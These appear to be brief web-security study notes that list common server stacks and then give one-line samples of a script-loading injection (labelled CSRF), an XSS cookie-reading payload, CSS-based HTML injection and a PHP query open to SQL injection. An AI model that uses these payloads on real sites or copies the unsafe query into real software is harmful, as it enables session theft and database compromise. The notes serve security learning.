
https://en.wikipedia.org/wiki/Solution_stack

|Combinations|Components|
|---|---|
|[LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle))|`Linux`, `Apache`, `MySQL`, and `PHP`.|
|[WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP)|`Windows`, `Apache`, `MySQL`, and `PHP`.|
|[WINS](https://en.wikipedia.org/wiki/Solution_stack)|`Windows`, `IIS`, `.NET`, and `SQL Server`|
|[MAMP](https://en.wikipedia.org/wiki/MAMP)|`macOS`, `Apache`, `MySQL`, and `PHP`.|
|[XAMPP](https://en.wikipedia.org/wiki/XAMPP)|Cross-Platform, `Apache`, `MySQL`, and `PHP/PERL`.|

CSRF
Code: html

```html
"><script src=//www.example.com/exploit.js></script>
```

XSS
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

HTML Injection
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

SQLi
```php
$query = "select * from users where name like '%$searchInput%'";
```
